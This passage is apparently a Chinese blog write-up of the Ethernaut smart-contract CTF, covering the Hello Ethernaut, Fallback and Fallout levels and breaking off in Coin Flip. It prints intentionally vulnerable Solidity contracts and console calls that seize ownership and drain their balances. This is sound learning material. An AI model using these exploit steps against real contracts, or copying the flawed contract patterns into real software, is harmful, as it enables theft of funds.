<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"zpano.cn","root":"/","images":"/images","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false}};
  </script>

  <meta name="description" content="Ethernaut wp">
<meta property="og:type" content="article">
<meta property="og:title" content="Ethernaut wp">
<meta property="og:url" content="https://zpano.cn/2021/06/17/16/index.html">
<meta property="og:site_name" content="Zpano&#39;s Blog">
<meta property="og:description" content="Ethernaut wp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617044622032.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617045950026.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617051912925.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617054852440.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617054951941.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617060301242.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617061736552.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617150646354.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617063916725.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617151434286.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617153930963.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617154923739.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617155309438.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617161012697.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617162135418.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617170057604.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617172756652.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617172746510.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617180356753.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210617180252026.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210619144446168-7093025-7093100.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210619152931264-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210623122522463-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210623122511481-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210623195125291-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210623201122087-1624760853550-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210623200401783-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210623204943777-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210624112151430-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210624113103217-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210625202119077-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210626155940718-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210626142522049-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210626164122137-7093025.png">
<meta property="og:image" content="https://zpano.cn/2021/06/17/16/image-20210626174120276-7093025.png">
<meta property="article:published_time" content="2021-06-17T10:05:21.000Z">
<meta property="article:modified_time" content="2022-03-12T13:53:46.815Z">
<meta property="article:author" content="Zpano">
<meta property="article:tag" content="区块链安全">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zpano.cn/2021/06/17/16/image-20210617044622032.png">


<link rel="canonical" href="https://zpano.cn/2021/06/17/16/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Ethernaut wp | Zpano's Blog</title>
  






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --></head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Zpano's Blog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">不负韶华，不负野心</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <section class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Ethernaut-wp"><span class="nav-number">1.</span> <span class="nav-text">Ethernaut wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Hello-Ethernaut"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Fallback"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 Fallback</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Fallout"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 Fallout</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Coin-Flip"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 Coin Flip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Telephone"><span class="nav-number">1.5.</span> <span class="nav-text">0x05 Telephone</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Token"><span class="nav-number">1.6.</span> <span class="nav-text">0x06 Token</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Delegation"><span class="nav-number">1.7.</span> <span class="nav-text">0x07 Delegation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X08-Force"><span class="nav-number">1.8.</span> <span class="nav-text">0X08 Force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-Vault"><span class="nav-number">1.9.</span> <span class="nav-text">0x09 Vault</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-King"><span class="nav-number">1.10.</span> <span class="nav-text">0x0A King</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-Re-entrancy"><span class="nav-number">1.11.</span> <span class="nav-text">0x0B Re-entrancy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0C-Elevator"><span class="nav-number">1.12.</span> <span class="nav-text">0x0C Elevator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0D-Privacy"><span class="nav-number">1.13.</span> <span class="nav-text">0x0D Privacy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0E-Gatekeeper-One"><span class="nav-number">1.14.</span> <span class="nav-text">0x0E Gatekeeper One</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0F-Gatekeeper-Two"><span class="nav-number">1.15.</span> <span class="nav-text">0x0F Gatekeeper Two</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-Naught-Coin"><span class="nav-number">1.16.</span> <span class="nav-text">0x10 Naught Coin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-Preservation"><span class="nav-number">1.17.</span> <span class="nav-text">0x11 Preservation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x12-Recovery"><span class="nav-number">1.18.</span> <span class="nav-text">0x12 Recovery</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x13-MagicNumber"><span class="nav-number">1.19.</span> <span class="nav-text">0x13 MagicNumber</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x14-Alien-Codex"><span class="nav-number">1.20.</span> <span class="nav-text">0x14 Alien Codex</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x15-Denial"><span class="nav-number">1.21.</span> <span class="nav-text">0x15 Denial</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x16-Shop"><span class="nav-number">1.22.</span> <span class="nav-text">0x16 Shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x17-Dex"><span class="nav-number">1.23.</span> <span class="nav-text">0x17 Dex</span></a></li></ol></li></ol></div>
        </section>
        <!--/noindex-->

        <section class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Zpano"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Zpano</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="cc-license site-overview-item animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



        </section>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://zpano.cn/2021/06/17/16/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Zpano">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zpano's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Ethernaut wp
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-06-17 18:05:21" itemprop="dateCreated datePublished" datetime="2021-06-17T18:05:21+08:00">2021-06-17</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-03-12 21:53:46" itemprop="dateModified" datetime="2022-03-12T21:53:46+08:00">2022-03-12</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">区块链安全</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>30k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>27 分钟</span>
    </span>
</div>

            <div class="post-description">Ethernaut wp</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="Ethernaut-wp"><a href="#Ethernaut-wp" class="headerlink" title="Ethernaut wp"></a>Ethernaut wp</h1><p>刷区块链题目的<a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/">平台</a>，正好学习一下</p>
<p><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/search/metamask?hl=zh-CN">METAMASK</a></p>
<p><a target="_blank" rel="noopener" href="https://remix.ethereum.org/">remix</a></p>
<h2 id="0x01-Hello-Ethernaut"><a href="#0x01-Hello-Ethernaut" class="headerlink" title="0x01 Hello Ethernaut"></a>0x01 Hello Ethernaut</h2><p>上面的插件下好之后注册一个账户，确认链接之后切换到Rinkey测试网络</p>
<p>按照题目提示一步步做就是了</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract.info()</span><br><span class="line"><span class="comment">// &quot;You will find what you need in info1().&quot;</span></span><br><span class="line">contract.info1()</span><br><span class="line"><span class="comment">// &quot;Try info2(), but with &quot;hello&quot; as a parameter.&quot;</span></span><br><span class="line">contract.info2(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;The property infoNum holds the number of the next info method to call.&quot;</span></span><br><span class="line">contract.infoNum()</span><br><span class="line"><span class="comment">// 42</span></span><br><span class="line">contract.info42()</span><br><span class="line"><span class="comment">// &quot;theMethodName is the name of the next method.&quot;</span></span><br><span class="line">contract.theMethodName()</span><br><span class="line"><span class="comment">// &quot;The method name is method7123949.&quot;</span></span><br><span class="line">contract.method7123949()</span><br><span class="line"><span class="comment">// &quot;If you know the password, submit it to authenticate().&quot;</span></span><br><span class="line">contract.password()</span><br><span class="line"><span class="comment">// &quot;ethernaut0&quot;</span></span><br><span class="line">contract.authenticate(<span class="string">&#x27;ethernaut0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617044622032.png" alt="image-20210617044622032"></p>
<h2 id="0x02-Fallback"><a href="#0x02-Fallback" class="headerlink" title="0x02 Fallback"></a>0x02 Fallback</h2><p>考察知识点，函数调用，不是重入漏洞</p>
<ol>
<li>you claim ownership of the contract</li>
<li>you reduce its balance to 0</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;   <span class="comment">//使用安全函数</span></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;  <span class="comment">//地址贡献值映射</span></span><br><span class="line">  address payable public owner;    <span class="comment">//定义合约拥有者</span></span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;     <span class="comment">//初始化</span></span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;    <span class="comment">//定义函数修改器验证是否是拥有者</span></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">contribute</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;  <span class="comment">//收钱函数</span></span><br><span class="line">    <span class="built_in">require</span>(msg.value &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getContribution</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;    <span class="comment">//返回贡献值函数</span></span><br><span class="line">    <span class="keyword">return</span> contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;   <span class="comment">//退钱函数</span></span><br><span class="line">    owner.transfer(address(<span class="built_in">this</span>).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;    <span class="comment">//改变拥有者函数</span></span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span> &amp;&amp; contributions[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>多转钱，就能使合约拥有者变成自己</li>
<li>调用fallback函数，绕过验证后也能变成自己，fallback函数在调用Transfer函数的时候会调用</li>
<li>调用withdraw函数，账户清零</li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract.contribute(&#123;value:<span class="number">1</span>&#125;)  <span class="regexp">//</span>要求<span class="number">1</span></span><br><span class="line"><span class="regexp">//</span>保证在执行FallBack函数时，能通过contributions[msg.sender] &gt; <span class="number">0</span>的校验</span><br><span class="line">contract.sendTransaction(&#123;value:<span class="number">1</span>&#125;) 或者 用MetaMask的发送功能。<span class="regexp">//</span>要求<span class="number">1</span></span><br><span class="line"><span class="regexp">//</span>通过转账调用Fallback函数。</span><br><span class="line">contract.withdraw() <span class="regexp">//</span>要求<span class="number">2</span></span><br><span class="line"><span class="regexp">//</span>转走合约的钱。</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617045950026.png" alt="image-20210617045950026"></p>
<h2 id="0x03-Fallout"><a href="#0x03-Fallout" class="headerlink" title="0x03 Fallout"></a>0x03 Fallout</h2><p>使合约拥有者变成自己</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fal1out</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        <span class="built_in">require</span>(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocate</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sendAllocation</span>(<span class="params">address payable allocator</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">collectAllocations</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    msg.sender.transfer(address(<span class="built_in">this</span>).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocatorBalance</span>(<span class="params">address allocator</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了一通代码发现Fallout函数不是构造函数，可以直接调用</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">contract</span>.Fal<span class="number">1</span>out()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617051912925.png" alt="image-20210617051912925"></p>
<h2 id="0x04-Coin-Flip"><a href="#0x04-Coin-Flip" class="headerlink" title="0x04 Coin Flip"></a>0x04 Coin Flip</h2><p>猜硬币游戏，连续猜对十次</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span 